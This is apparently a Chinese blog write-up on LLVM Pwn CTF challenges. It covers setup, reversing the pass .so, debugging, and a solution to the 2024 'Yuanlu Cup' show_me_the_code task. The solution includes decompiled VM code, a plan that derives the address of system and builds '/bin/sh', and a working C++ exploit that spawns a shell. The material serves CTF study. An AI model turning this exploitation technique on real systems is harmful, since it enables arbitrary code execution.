---
title: LLVM Pwn
date: 2024-10-23 15:22:37
tags: [笔记, LLVM Pwn]
categories: 
    - 笔记
---

LLVM Pwn大多都是通过LLVM Opt优化代码时的漏洞来完成利用的。Opt优化代码的主要逻辑在出题人编译的.so文件内，所以主要是逆向这个.so文件找漏洞。

# 环境安装

通过`./opt --version`查看LLVM版本

然后安装对应版本的LLVM和Clang，以opt-12为例：

LLVM：
```sh
sudo apt-get install llvm-12  
```

Clang：
```sh
sudo apt-get install clang-12   
```

# .so逆向

首先需要找到`runOnFunction`函数，ida`shift+f7`打开Segments面板，找到 `.data.rel.ro` 段，`runOnFunction`一般就是这个段的最后一个函数。

然后需要找到 `Pass Name` ，`Pass Name` 在执行Opt命令时需要用到，一般直接字符串搜索Pass，然后通过交叉引用看引用函数，特征如下：

![alt text](image.png)

其中 `Co00o0oOd3` 就是 Pass Name


# .ll文件生成

opt分析的文件类型为.ll，.ll是一种中间代码，可由clang编译而来，命令如下：
```sh
clang-12 -emit-llvm -S your_exp.cpp -o your_exp.ll 
```

其中 -emit-llvm 告诉编译器生成LLVM IR，-S 表示生成汇编代码（在这里是LLVM IR），而不是目标文件。


# 调试

首先gdb opt-xx(xx为版本)进入gdb，然后在gdb内设置参数：
```gdb
set args -load ./your_so_file.so -your_pass_name ./your_exp.ll
```

需要注意的是，刚进入main函数时，your_so_file.so文件还没有被opt加载，因此需要运行到大概main+700左右时才会加载your_so_file.so，可以通过vmmap查看。

# 例题

## 2024“源鲁杯” show_me_the_code

### 分析

#### 函数分析

- runOnFunction函数：
![](image-1.png)

该函数判断函数名是否等于它生成的函数名，如果相等才进入vmRun函数，这个生成的函数名可以通过动调拿到，值为`_Z10c0deVmMainv`。

- vmRun函数

```C
__int64 __fastcall `anonymous namespace'::c0oo0o0Ode::vmRun(
        _anonymous_namespace_::c0oo0o0Ode *this,
        llvm::Function *a2)
{
  __int64 v2; // rax
  __int64 result; // rax
  llvm::BasicBlock *v4; // rax
  llvm::BasicBlock *v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rax
  __int64 v14; // [rsp+10h] [rbp-40h] BYREF
  __int64 v15; // [rsp+18h] [rbp-38h] BYREF
  __int64 v16; // [rsp+20h] [rbp-30h] BYREF
  _BYTE v17[8]; // [rsp+28h] [rbp-28h] BYREF
  __int64 v18; // [rsp+30h] [rbp-20h] BYREF
  _BYTE v19[8]; // [rsp+38h] [rbp-18h] BYREF
  llvm::Function *v20; // [rsp+40h] [rbp-10h]
  _anonymous_namespace_::c0oo0o0Ode *v21; // [rsp+48h] [rbp-8h]

  v21 = this;
  v20 = a2;
  v2 = llvm::errs(this);
  llvm::raw_ostream::operator<<(v2, "Talk is cheap. Show me the code!\n");
  v18 = llvm::Function::end(a2);
  llvm::ilist_iterator<llvm::ilist_detail::node_options<llvm::BasicBlock,false,false,void>,false,true>::ilist_iterator<false>(
    v19,
    &v18,
    0LL);
  v16 = llvm::Function::begin(v20);
  llvm::ilist_iterator<llvm::ilist_detail::node_options<llvm::BasicBlock,false,false,void>,false,true>::ilist_iterator<false>(
    v17,
    &v16,
    0LL);
  while ( 1 )
  {
    result = llvm::operator!=(v17, v19);
    if ( (result & 1) == 0 )
      break;
    v4 = (llvm::BasicBlock *)llvm::ilist_iterator<llvm::ilist_detail::node_options<llvm::BasicBlock,false,false,void>,false,true>::operator->(v17);
    v15 = llvm::BasicBlock::begin(v4);
    v5 = (llvm::BasicBlock *)llvm::ilist_iterator<llvm::ilist_detail::node_options<llvm::BasicBlock,false,false,void>,false,true>::operator->(v17);
    v14 = llvm::BasicBlock::end(v5);
    while ( (llvm::operator!=(&v15, &v14) & 1) != 0 )
    {
      v6 = std::vector<std::string>::operator[](&`anonymous namespace'::ops[abi:cxx11], 0LL);
      if ( (`anonymous namespace'::c0oo0o0Ode::isValidOp(this, &v15, v6) & 1) != 0 )
      {
        `anonymous namespace'::c0oo0o0Ode::op1(this, &v15);
      }
      else
      {
        v7 = std::vector<std::string>::operator[](&`anonymous namespace'::ops[abi:cxx11], 1LL);
        if ( (`anonymous namespace'::c0oo0o0Ode::isValidOp(this, &v15, v7) & 1) != 0 )
        {
          `anonymous namespace'::c0oo0o0Ode::op2(this, &v15);
        }
        else
        {
          v8 = std::vector<std::string>::operator[](&`anonymous namespace'::ops[abi:cxx11], 2LL);
          if ( (`anonymous namespace'::c0oo0o0Ode::isValidOp(this, &v15, v8) & 1) != 0 )
          {
            `anonymous namespace'::c0oo0o0Ode::op3(this, &v15);
          }
          else
          {
            v9 = std::vector<std::string>::operator[](&`anonymous namespace'::ops[abi:cxx11], 3LL);
            if ( (`anonymous namespace'::c0oo0o0Ode::isValidOp(this, &v15, v9) & 1) != 0 )
            {
              `anonymous namespace'::c0oo0o0Ode::op4(this, &v15);
            }
            else
            {
              v10 = std::vector<std::string>::operator[](&`anonymous namespace'::ops[abi:cxx11], 4LL);
              if ( (`anonymous namespace'::c0oo0o0Ode::isValidOp(this, &v15, v10) & 1) != 0 )
              {
                `anonymous namespace'::c0oo0o0Ode::op5(this, &v15);
              }
              else
              {
                v11 = std::vector<std::string>::operator[](&`anonymous namespace'::ops[abi:cxx11], 5LL);
                if ( (`anonymous namespace'::c0oo0o0Ode::isValidOp(this, &v15, v11) & 1) != 0 )
                {
                  `anonymous namespace'::c0oo0o0Ode::op6(this, &v15);
                }
                else
                {
                  v12 = std::vector<std::string>::operator[](&`anonymous namespace'::ops[abi:cxx11], 6LL);
                  if ( (`anonymous namespace'::c0oo0o0Ode::isValidOp(this, &v15, v12) & 1) != 0 )
                  {
                    `anonymous namespace'::c0oo0o0Ode::op7(this, &v15);
                  }
                  else
                  {
                    v13 = std::vector<std::string>::operator[](&`anonymous namespace'::ops[abi:cxx11], 7LL);
                    if ( (`anonymous namespace'::c0oo0o0Ode::isValidOp(this, &v15, v13) & 1) != 0 )
                      `anonymous namespace'::c0oo0o0Ode::op8(this, &v15);
                  }
                }
              }
            }
          }
        }
      }
      llvm::ilist_iterator<llvm::ilist_detail::node_options<llvm::Instruction,false,false,void>,false,true>::operator++(&v15);
    }
    llvm::ilist_iterator<llvm::ilist_detail::node_options<llvm::BasicBlock,false,false,void>,false,true>::operator++(v17);
  }
  return result;
}
```

该函数遍历`_Z10c0deVmMainv`内的所有指令，通过`isValidOp`检测后执行相应操作。

- isValidOp函数

```C
__int64 __fastcall `anonymous namespace'::c0oo0o0Ode::isValidOp(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rdx
  char v5; // [rsp+Fh] [rbp-81h]
  _BYTE v6[32]; // [rsp+18h] [rbp-78h] BYREF
  _QWORD v7[2]; // [rsp+38h] [rbp-58h] BYREF
  __int64 Name; // [rsp+48h] [rbp-48h]
  __int64 v9; // [rsp+50h] [rbp-40h]
  llvm::Value *v10; // [rsp+58h] [rbp-38h]
  __int64 CalledOperand; // [rsp+60h] [rbp-30h]
  llvm::CallBase *v12; // [rsp+68h] [rbp-28h]
  __int64 v13; // [rsp+70h] [rbp-20h]
  __int64 v14; // [rsp+78h] [rbp-18h]
  __int64 v15; // [rsp+80h] [rbp-10h]
  char v16; // [rsp+8Fh] [rbp-1h]

  v15 = a1;
  v14 = a2;
  v13 = a3;
  v12 = (llvm::CallBase *)llvm::dyn_cast<llvm::CallInst,llvm::ilist_iterator<llvm::ilist_detail::node_options<llvm::Instruction,false,false,void>,false,true>>(a2);
  if ( !v12 )
    goto LABEL_6;
  CalledOperand = llvm::CallBase::getCalledOperand(v12);
  v10 = (llvm::Value *)llvm::dyn_cast<llvm::Function,llvm::Value>(CalledOperand);
  if ( !v10 )
    goto LABEL_6;
  Name = llvm::Value::getName(v10);
  v9 = v3;
  VMDatProt::getStrFromProt2(v6, v13, &secret::vmKey[abi:cxx11]);
  llvm::StringRef::StringRef(v7, v6);
  v5 = llvm::operator==(Name, v9, v7[0], v7[1]);
  std::string::~string(v6);
  if ( (v5 & 1) != 0 && (`anonymous namespace'::c0oo0o0Ode::isValidEnv(a1, v14) & 1) != 0 )
    v16 = 1;
  else
LABEL_6:
    v16 = 0;
  return v16 & 1;
}
```

该函数首先检查指令是否是Call，如果是Call则进一步检查被Call的函数名字是否为生成的函数名，这里生成的函数名同样可以通过动调拿到，根据`isValidOp`函数第三个参数的不同，`getStrFromProt2`会生成不同的函数名，对应不同的操作。如果函数名一致，则继续通过`isValidEnv`函数检查参数。

- isValidEnv函数

```C
__int64 __fastcall `anonymous namespace'::c0oo0o0Ode::isValidEnv(__int64 a1, __int64 a2)
{
  __int64 Type; // rax
  __int64 v3; // rdx
  char v5; // [rsp+7h] [rbp-C9h]
  _BYTE v6[32]; // [rsp+8h] [rbp-C8h] BYREF
  _BYTE v7[8]; // [rsp+28h] [rbp-A8h] BYREF
  _BYTE v8[32]; // [rsp+30h] [rbp-A0h] BYREF
  _BYTE v9[32]; // [rsp+50h] [rbp-80h] BYREF
  _QWORD v10[2]; // [rsp+70h] [rbp-60h] BYREF
  __int64 StructName; // [rsp+80h] [rbp-50h]
  __int64 v12; // [rsp+88h] [rbp-48h]
  llvm::Type *v13; // [rsp+90h] [rbp-40h]
  llvm::Type *ElementType; // [rsp+98h] [rbp-38h]
  llvm::PointerType *v15; // [rsp+A0h] [rbp-30h]
  llvm::Value *ArgOperand; // [rsp+A8h] [rbp-28h]
  llvm::CallBase *v17; // [rsp+B0h] [rbp-20h]
  __int64 v18; // [rsp+B8h] [rbp-18h]
  __int64 v19; // [rsp+C0h] [rbp-10h]
  char v20; // [rsp+CFh] [rbp-1h]

  v19 = a1;
  v18 = a2;
  v17 = (llvm::CallBase *)llvm::dyn_cast<llvm::CallInst,llvm::ilist_iterator<llvm::ilist_detail::node_options<llvm::Instruction,false,false,void>,false,true>>(a2);
  if ( !v17 )
    goto LABEL_6;
  ArgOperand = (llvm::Value *)llvm::CallBase::getArgOperand(v17, 0);
  Type = llvm::Value::getType(ArgOperand);
  v15 = (llvm::PointerType *)llvm::dyn_cast<llvm::PointerType,llvm::Type>(Type);
  if ( !v15 )
    goto LABEL_6;
  ElementType = (llvm::Type *)llvm::PointerType::getElementType(v15);
  if ( (llvm::Type::isStructTy(ElementType) & 1) == 0 )
    goto LABEL_6;
  v13 = (llvm::Type *)llvm::cast<llvm::StructType,llvm::Type>(ElementType);
  StructName = llvm::Type::getStructName(v13);
  v12 = v3;
  std::allocator<char>::allocator(v7);
  std::string::basic_string(v8, "class.", v7);
  VMDatProt::getStrFromProt2(v6, &`anonymous namespace'::vmEnvName[abi:cxx11], &secret::vmKey[abi:cxx11]);
  std::operator+<char>(v9, v8, v6);
  llvm::StringRef::StringRef(v10, v9);
  v5 = llvm::operator==(StructName, v12, v10[0], v10[1]);
  std::string::~string(v9);
  std::string::~string(v6);
  std::string::~string(v8);
  std::allocator<char>::~allocator(v7);
  if ( (v5 & 1) != 0 )
    v20 = 1;
  else
LABEL_6:
    v20 = 0;
  return v20 & 1;
}
```

`isValidEnv`函数获取被call函数的一个参数，检查它是否是class指针，否则返回0.

- op1函数

```C
__int64 __fastcall `anonymous namespace'::c0oo0o0Ode::op1(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  llvm::Type *Type; // rax
  llvm::Type *v4; // rax
  __int64 v5; // rax
  __int64 v6; // [rsp+0h] [rbp-50h]
  llvm::ConstantInt *v7; // [rsp+10h] [rbp-40h]
  llvm::ConstantInt *v8; // [rsp+18h] [rbp-38h]
  llvm::Value *ArgOperand; // [rsp+20h] [rbp-30h]
  int i; // [rsp+28h] [rbp-28h]
  _DWORD v11[2]; // [rsp+2Ch] [rbp-24h]
  unsigned __int8 ZExtValue; // [rsp+37h] [rbp-19h]
  llvm::CallBase *v13; // [rsp+38h] [rbp-18h]
  __int64 v14; // [rsp+40h] [rbp-10h]
  __int64 v15; // [rsp+48h] [rbp-8h]

  v15 = a1;
  v14 = a2;
  result = llvm::dyn_cast<llvm::CallInst,llvm::ilist_iterator<llvm::ilist_detail::node_options<llvm::Instruction,false,false,void>,false,true>>(a2);
  v13 = (llvm::CallBase *)result;
  if ( result )
  {
    for ( i = 0; i < (unsigned int)llvm::CallBase::getNumArgOperands(v13); ++i )
    {
      ArgOperand = (llvm::Value *)llvm::CallBase::getArgOperand(v13, i);
      Type = (llvm::Type *)llvm::Value::getType(ArgOperand);
      if ( (llvm::Type::isIntegerTy(Type, 8u) & 1) != 0 && i == 1 )
      {
        v8 = (llvm::ConstantInt *)llvm::dyn_cast<llvm::ConstantInt,llvm::Value>(ArgOperand);
        if ( v8 )
          ZExtValue = llvm::ConstantInt::getZExtValue(v8);
      }
      v4 = (llvm::Type *)llvm::Value::getType(ArgOperand);
      if ( (llvm::Type::isIntegerTy(v4) & 1) != 0 && i > 1 )
      {
        v7 = (llvm::ConstantInt *)llvm::dyn_cast<llvm::ConstantInt,llvm::Value>(ArgOperand);
        if ( v7 )
          v11[i - 2] = llvm::ConstantInt::getZExtValue(v7);
      }
    }
    result = ZExtValue;
    if ( ZExtValue <= 5u )
    {
      v6 = (unsigned int)(v11[1] + v11[0]);
      *(_QWORD *)std::vector<unsigned long>::operator[](&secret::regs, ZExtValue) = v6;
      v5 = llvm::errs((llvm *)&secret::regs);
      return llvm::raw_ostream::operator<<(v5, "Op1 done.\n");
    }
  }
  return result;
}
```

regs数组长8，其中regs[6]是mem指针，regs[7]是一个ld地址。

op1函数实现了一个add操作，将参数3和参数4的值相加，存到regs[idx]里面，idx为参数2（只能写入一个32位数）。

#### Vm分析

op1到op8对应了八种操作

- op1
regs[arg2]=arg3+arg4

- op2
regs[arg2]+=arg3

- op3
if arg3 == 1:
    regs[arg2] <<= arg4
else:
    regs[arg2] >>= arg4

- op4
regs[arg2] = regs[arg3] | regs[arg4]

- op5
regs[arg2] = regs[arg3]

- op6
mem[arg3] = regs[arg2]

- op7
regs[arg2] = mem[arg3]

- op8
call mem[arg3] (regs[arg2])


### 利用

regs[6]为mem的地址，regs[7]为ld地址，可以通过mov将地址移动到regs[0-5]，通过shift将ld右移32位，减去固定偏移0x60D得到system函数高四字节地址，由于低12比特的值固定，所以需要爆破一个4比特，1/16的概率（后来给Docker发现远程环境没开ASLR，所以不需要爆破）。有system地址后通过add、shift和or指令构造"/bin/sh"字符串，构造好后通过save指令保存到mem[0]，最后直接call就行。


### Exp
```cpp
class edoc
{
    int a;
    int b;
};
extern "C" void _ZN4edoc4addiEhii(edoc *A, unsigned char idx, int num1, int num2);
extern "C" void _ZN4edoc4loadEhj(edoc *A, int idx, int num);
extern "C" void _ZN4edoc4movrEhh(edoc *A, unsigned char dst, unsigned char src);
extern "C" void _ZN4edoc4chgrEhi(edoc *A, unsigned char idx, int num);
extern "C" void _ZN4edoc4borrEhhh(edoc *A, unsigned char idx, unsigned char num1, unsigned char num2);
extern "C" void _ZN4edoc4sftrEhbh(edoc *A, unsigned char idx, bool choice, unsigned char num); // 1 left , 0 right
extern "C" void _ZN4edoc4runcEhj(edoc *A, unsigned char idx, int num);
extern "C" void _ZN4edoc4saveEhj(edoc *A, unsigned char idx, int num);

extern "C" void _Z10c0deVmMainv()
{
    edoc A;
    _ZN4edoc4movrEhh(&A, 0, 7);
    _ZN4edoc4sftrEhbh(&A, 0, 0, 16);
    _ZN4edoc4chgrEhi(&A, 0, -0x60D);
    _ZN4edoc4addiEhii(&A, 1, 0, 0x3d70);
    _ZN4edoc4addiEhii(&A, 2, 0, 0x68732f);
    _ZN4edoc4sftrEhbh(&A, 2, 1, 32);
    _ZN4edoc4addiEhii(&A, 3, 0, 0x6e69622f);
    _ZN4edoc4borrEhhh(&A, 2, 2, 3);
    _ZN4edoc4saveEhj(&A, 2, 0);
    _ZN4edoc4sftrEhbh(&A, 0, 1, 16);
    _ZN4edoc4borrEhhh(&A, 1, 1, 0);
    _ZN4edoc4movrEhh(&A, 2, 6);
    _ZN4edoc4saveEhj(&A, 1, 8);
    _ZN4edoc4runcEhj(&A, 2, 8);
}
```